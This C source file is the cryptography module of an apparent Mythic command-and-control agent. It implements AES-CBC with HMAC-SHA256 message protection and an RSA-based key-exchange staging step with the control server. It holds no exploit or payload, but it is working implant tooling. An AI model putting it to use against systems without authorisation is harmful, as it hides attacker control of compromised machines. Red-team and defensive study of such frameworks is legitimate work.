#include "crypto.h"

#if defined(ENCRYPTION_STATIC_KEY) || defined(ENCRYPTION_EKE)

#include "b64.h"
#include "c2.h"
#include "utils.h"
#include <errno.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <wolfssl/wolfcrypt/aes.h>
#include <wolfssl/wolfcrypt/hmac.h>
#include <wolfssl/wolfcrypt/random.h>

#define AES_KEY_SIZE  32
#define AES_IV_SIZE   16
#define AES_BLOCK     16
#define HMAC_SIZE     32

// PKCS7-pad src into a freshly-allocated buffer aligned to AES_BLOCK.
// Returns pointer (caller frees) and writes padded length to *padded_len.
static unsigned char *pkcs7_pad(const unsigned char *src, size_t src_len,
                                 size_t *padded_len) {
    size_t pad = AES_BLOCK - (src_len % AES_BLOCK);
    *padded_len = src_len + pad;
    unsigned char *buf = malloc(*padded_len);
    if (!buf)
        return NULL;
    memcpy(buf, src, src_len);
    memset(buf + src_len, (int)pad, pad);
    return buf;
}

// Strip PKCS7 padding in-place. Returns unpadded length or 0 on error.
static size_t pkcs7_unpad(unsigned char *buf, size_t len) {
    if (len == 0 || len % AES_BLOCK != 0)
        return 0;
    unsigned char pad = buf[len - 1];
    if (pad == 0 || pad > AES_BLOCK)
        return 0;
    for (size_t i = len - pad; i < len; i++) {
        if (buf[i] != pad)
            return 0;
    }
    return len - pad;
}

// Constant-time byte comparison (avoids timing attacks on HMAC verify).
static int ct_memcmp(const void *a, const void *b, size_t n) {
    const unsigned char *pa = (const unsigned char *)a;
    const unsigned char *pb = (const unsigned char *)b;
    unsigned char diff = 0;
    for (size_t i = 0; i < n; i++)
        diff |= pa[i] ^ pb[i];
    return diff != 0;
}

int crypto_encrypt(const unsigned char *key,
                   const unsigned char *plain, size_t plain_len,
                   unsigned char **out, size_t *out_len) {
    WC_RNG rng;
    Aes aes;
    Hmac hmac;

    if (wc_InitRng(&rng) != 0)
        return -1;

    unsigned char iv[AES_IV_SIZE];
    if (wc_RNG_GenerateBlock(&rng, iv, AES_IV_SIZE) != 0) {
        wc_FreeRng(&rng);
        return -1;
    }
    wc_FreeRng(&rng);

    size_t padded_len;
    unsigned char *padded = pkcs7_pad(plain, plain_len, &padded_len);
    if (!padded)
        return -1;

    unsigned char *ciphertext = malloc(padded_len);
    if (!ciphertext) {
        free(padded);
        return -1;
    }

    if (wc_AesSetKey(&aes, key, AES_KEY_SIZE, iv, AES_ENCRYPTION) != 0 ||
        wc_AesCbcEncrypt(&aes, ciphertext, padded, (word32)padded_len) != 0) {
        free(padded);
        free(ciphertext);
        return -1;
    }
    free(padded);

    // HMAC-SHA256 over IV[16] + ciphertext (Mythic wire format)
    unsigned char mac[HMAC_SIZE];
    if (wc_HmacSetKey(&hmac, WC_SHA256, key, AES_KEY_SIZE) != 0 ||
        wc_HmacUpdate(&hmac, iv, AES_IV_SIZE) != 0 ||
        wc_HmacUpdate(&hmac, ciphertext, (word32)padded_len) != 0 ||
        wc_HmacFinal(&hmac, mac) != 0) {
        free(ciphertext);
        return -1;
    }

    // Output: IV + ciphertext + HMAC
    *out_len = AES_IV_SIZE + padded_len + HMAC_SIZE;
    *out = malloc(*out_len);
    if (!*out) {
        free(ciphertext);
        return -1;
    }
    memcpy(*out,                              iv,         AES_IV_SIZE);
    memcpy(*out + AES_IV_SIZE,                ciphertext, padded_len);
    memcpy(*out + AES_IV_SIZE + padded_len,   mac,        HMAC_SIZE);

    free(ciphertext);
    return 0;
}

int crypto_decrypt(const unsigned char *key,
                   const unsigned char *in, size_t in_len,
                   unsigned char **out, size_t *out_len) {
    // Minimum: IV(16) + one AES block(16) + HMAC(32) = 64 bytes
    if (in_len < AES_IV_SIZE + AES_BLOCK + HMAC_SIZE)
        return -1;

    size_t cipher_len = in_len - AES_IV_SIZE - HMAC_SIZE;
    if (cipher_len % AES_BLOCK != 0)
        return -1;

    const unsigned char *iv         = in;
    const unsigned char *ciphertext = in + AES_IV_SIZE;
    const unsigned char *mac_in     = in + AES_IV_SIZE + cipher_len;

    // Verify HMAC before decrypting (over IV + ciphertext, matching Mythic wire format).
    Hmac hmac;
    unsigned char mac_computed[HMAC_SIZE];
    if (wc_HmacSetKey(&hmac, WC_SHA256, key, AES_KEY_SIZE) != 0 ||
        wc_HmacUpdate(&hmac, iv, AES_IV_SIZE) != 0 ||
        wc_HmacUpdate(&hmac, ciphertext, (word32)cipher_len) != 0 ||
        wc_HmacFinal(&hmac, mac_computed) != 0)
        return -1;

    if (ct_memcmp(mac_in, mac_computed, HMAC_SIZE) != 0) {
        DBGPRINT("crypto_decrypt: HMAC mismatch");
        return -1;
    }

    unsigned char *plain = malloc(cipher_len);
    if (!plain)
        return -1;

    Aes aes;
    if (wc_AesSetKey(&aes, key, AES_KEY_SIZE, iv, AES_DECRYPTION) != 0 ||
        wc_AesCbcDecrypt(&aes, plain, ciphertext, (word32)cipher_len) != 0) {
        free(plain);
        return -1;
    }

    size_t unpadded = pkcs7_unpad(plain, cipher_len);
    if (unpadded == 0) {
        free(plain);
        return -1;
    }

    plain[unpadded] = '\0'; // NUL-terminate for JSON parsing
    *out = plain;
    *out_len = unpadded;
    return 0;
}

#endif // ENCRYPTION_STATIC_KEY || ENCRYPTION_EKE

// ---------------------------------------------------------------------------
// EKE staging
// ---------------------------------------------------------------------------

#ifdef ENCRYPTION_EKE

#include "cJSON.h"
#include <wolfssl/wolfcrypt/asn_public.h>
#include <wolfssl/wolfcrypt/rsa.h>

#define SESSION_ID_LEN 20
#define RSA_KEY_BITS   4096

static const char SESSION_ID_CHARS[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

static void gen_session_id(WC_RNG *rng, char out[SESSION_ID_LEN + 1]) {
    unsigned char raw[SESSION_ID_LEN];
    wc_RNG_GenerateBlock(rng, raw, SESSION_ID_LEN);
    for (int i = 0; i < SESSION_ID_LEN; i++)
        out[i] = SESSION_ID_CHARS[raw[i] % 62];
    out[SESSION_ID_LEN] = '\0';
}

// Performs the Mythic EKE staging exchange:
//   1. Generate RSA-4096 keypair; send public key to Mythic (AES-encrypted with AESPSK).
//   2. Mythic returns a new AES session key RSA-OAEP(SHA-1)-encrypted with agent's pub key.
//   3. Decrypt session key with private key; update agent->uuid and agent->session_key.
int crypto_eke_stage(Agent *agent) {
    WC_RNG rng;
    RsaKey rsa;
    // All pointer/array declarations at top so gotos don't skip initializers.
    int ret;
    int pub_der_len;
    int dec_ret;
    size_t pub_b64_len;
    size_t enc_len;
    size_t msg_len;
    size_t b64_len;
    size_t decoded_len;
    size_t plain_len;
    size_t enc_key_len;
    char *pub_b64;
    char *stage_str;
    char *b64;
    unsigned char *enc;
    unsigned char *msg;
    unsigned char *decoded;
    unsigned char *plain;
    unsigned char *enc_key;
    cJSON *stage_json;
    cJSON *resp_json;
    cJSON *j_uuid;
    cJSON *j_session_key_item;
    cJSON *j_session_id;
    unsigned char pub_der[700]; // 4096-bit SPKI DER fits in ~550 bytes
    unsigned char new_key[AES_KEY_SIZE];
    char session_id[SESSION_ID_LEN + 1];
    MsgResp stage_resp;

    ret = -1;
    pub_b64 = NULL; stage_str = NULL; b64 = NULL;
    enc = NULL; msg = NULL; decoded = NULL; plain = NULL; enc_key = NULL;
    stage_json = NULL; resp_json = NULL;
    memset(&stage_resp, 0, sizeof(stage_resp));

    if (wc_InitRng(&rng) != 0)
        return -1;
    if (wc_InitRsaKey(&rsa, NULL) != 0) {
        wc_FreeRng(&rng);
        return -1;
    }

    // 1. Generate RSA-4096 keypair (agent-side; public key sent to Mythic).
    DBGPRINT("EKE: generating RSA-%d keypair", RSA_KEY_BITS);
    if (wc_MakeRsaKey(&rsa, RSA_KEY_BITS, 65537, &rng) != 0) {
        DBGPRINT("EKE: wc_MakeRsaKey failed");
        goto cleanup;
    }
    if (wc_RsaSetRNG(&rsa, &rng) != 0) {
        DBGPRINT("EKE: wc_RsaSetRNG failed");
        goto cleanup;
    }

    // 2. Export SubjectPublicKeyInfo DER and base64-encode for "pub_key" field.
    pub_der_len = wc_RsaKeyToPublicDer(&rsa, pub_der, sizeof(pub_der));
    if (pub_der_len <= 0) {
        DBGPRINT("EKE: wc_RsaKeyToPublicDer failed (%d)", pub_der_len);
        goto cleanup;
    }
    DBGPRINT("EKE: pub_der_len=%d", pub_der_len);
    pub_b64 = base64_encode(pub_der, (size_t)pub_der_len, &pub_b64_len);
    if (!pub_b64)
        goto cleanup;

    // 3. Random 20-char alphanumeric session_id for response correlation.
    gen_session_id(&rng, session_id);
    DBGPRINT("EKE: session_id=%s", session_id);

    // 4. Build staging JSON: {"action":"staging_rsa","pub_key":"...","session_id":"..."}.
    stage_json = cJSON_CreateObject();
    if (!stage_json) { free(pub_b64); pub_b64 = NULL; goto cleanup; }
    cJSON_AddStringToObject(stage_json, "action", "staging_rsa");
    cJSON_AddStringToObject(stage_json, "pub_key", pub_b64);
    cJSON_AddStringToObject(stage_json, "session_id", session_id);
    free(pub_b64); pub_b64 = NULL;
    stage_str = cJSON_PrintUnformatted(stage_json);
    cJSON_Delete(stage_json); stage_json = NULL;
    if (!stage_str)
        goto cleanup;

    // 5. Encrypt with AESPSK (already loaded into agent->session_key).
    DBGPRINT("EKE: encrypting staging message");
    if (crypto_encrypt(agent->session_key,
                       (const unsigned char *)stage_str, strlen(stage_str),
                       &enc, &enc_len) != 0) {
        DBGPRINT("EKE: crypto_encrypt failed");
        cJSON_free(stage_str); stage_str = NULL;
        goto cleanup;
    }
    cJSON_free(stage_str); stage_str = NULL;

    // 6. Wire format: base64(UUID[36] + encrypted_body).
    msg_len = UUIDSIZE + enc_len;
    msg = malloc(msg_len);
    if (!msg) { free(enc); enc = NULL; goto cleanup; }
    memcpy(msg, agent->uuid, UUIDSIZE);
    memcpy(msg + UUIDSIZE, enc, enc_len);
    free(enc); enc = NULL;
    b64 = base64_encode(msg, msg_len, &b64_len);
    free(msg); msg = NULL;
    if (!b64)
        goto cleanup;

    // 7. Send staging message, receive server response.
    DBGPRINT("EKE: sending staging_rsa to server");
    {
        int send_ret = c2Send(agent, b64, (int)b64_len, &stage_resp);
        free(b64); b64 = NULL;
        if (send_ret != 0) {
            DBGPRINT("EKE: c2Send curl error (%d)", send_ret);
            goto cleanup;
        }
        if (!stage_resp.response) {
            DBGPRINT("EKE: server returned empty body (likely HTTP 404)");
            goto cleanup;
        }
    }
    DBGPRINT("EKE: got response (len=%zu)", strlen(stage_resp.response));

    // 8. Decode and decrypt the server response with AESPSK.
    decoded_len = str_rtrim(stage_resp.response, strlen(stage_resp.response));
    decoded = base64_decode(stage_resp.response, decoded_len, &decoded_len);
    free(stage_resp.response); stage_resp.response = NULL;
    if (!decoded || decoded_len <= UUIDSIZE) {
        DBGPRINT("EKE: base64_decode failed or response too short (%zu)", decoded_len);
        free(decoded); decoded = NULL;
        goto cleanup;
    }
    DBGPRINT("EKE: decoded response len=%zu, uuid=%.36s", decoded_len, (char *)decoded);
    if (crypto_decrypt(agent->session_key,
                       decoded + UUIDSIZE, decoded_len - UUIDSIZE,
                       &plain, &plain_len) != 0) {
        DBGPRINT("EKE: crypto_decrypt of server response failed");
        free(decoded); decoded = NULL;
        goto cleanup;
    }
    free(decoded); decoded = NULL;
    DBGPRINT("EKE: decrypted response: %.*s", (int)plain_len, (char *)plain);

    // 9. Parse JSON response: {"action":"staging_rsa","uuid":"...","session_key":"...","session_id":"..."}.
    resp_json = cJSON_ParseWithLength((char *)plain, plain_len);
    free(plain); plain = NULL;
    if (!resp_json) {
        DBGPRINT("EKE: cJSON_ParseWithLength failed on server response");
        goto cleanup;
    }
    j_uuid           = cJSON_GetObjectItem(resp_json, "uuid");
    j_session_key_item = cJSON_GetObjectItem(resp_json, "session_key");
    j_session_id     = cJSON_GetObjectItem(resp_json, "session_id");
    if (!cJSON_IsString(j_uuid) || !cJSON_IsString(j_session_key_item) ||
        !cJSON_IsString(j_session_id)) {
        DBGPRINT("EKE: missing fields in response JSON");
        goto cleanup_json;
    }
    if (strcmp(j_session_id->valuestring, session_id) != 0) {
        DBGPRINT("EKE: session_id mismatch (got=%s want=%s)",
                 j_session_id->valuestring, session_id);
        goto cleanup_json;
    }
    DBGPRINT("EKE: response uuid=%s", j_uuid->valuestring);

    // 10. base64-decode, then RSA-OAEP-SHA1 decrypt to recover 32-byte session key.
    enc_key = base64_decode(j_session_key_item->valuestring,
                             strlen(j_session_key_item->valuestring),
                             &enc_key_len);
    if (!enc_key) {
        DBGPRINT("EKE: base64_decode of session_key failed");
        goto cleanup_json;
    }
    DBGPRINT("EKE: RSA-decrypting session key (enc_key_len=%zu)", enc_key_len);
    dec_ret = wc_RsaPrivateDecrypt_ex(enc_key, (word32)enc_key_len,
                                       new_key, sizeof(new_key),
                                       &rsa,
                                       WC_RSA_OAEP_PAD,
                                       WC_HASH_TYPE_SHA,
                                       WC_MGF1SHA1,
                                       NULL, 0);
    free(enc_key); enc_key = NULL;
    if (dec_ret != AES_KEY_SIZE) {
        DBGPRINT("EKE: RSA decrypt returned %d (expected %d)", dec_ret, AES_KEY_SIZE);
        goto cleanup_json;
    }
    // 11. Commit: store negotiated UUID and session key in agent.
    memcpy(agent->uuid, j_uuid->valuestring, UUIDSIZE);
    memcpy(agent->session_key, new_key, AES_KEY_SIZE);
    DBGPRINT("EKE stage complete: uuid=%s", agent->uuid);
    ret = 0;

cleanup_json:
    cJSON_Delete(resp_json);
cleanup:
    wc_FreeRsaKey(&rsa);
    wc_FreeRng(&rng);
    return ret;
}

#endif // ENCRYPTION_EKE
